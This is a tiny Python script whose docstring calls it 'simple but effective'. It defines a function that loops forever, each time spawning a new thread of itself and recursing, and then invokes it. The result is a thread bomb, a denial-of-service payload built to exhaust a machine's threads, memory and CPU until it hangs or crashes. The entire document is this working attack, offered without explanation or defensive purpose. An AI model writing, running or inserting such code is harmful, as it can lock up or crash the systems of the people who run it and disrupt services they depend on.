''' Simple but effective(?)
    Cheers!!  :D    '''

import threading as t
def f():
    while True:
        t.Thread(target=f).start()
        f()

f()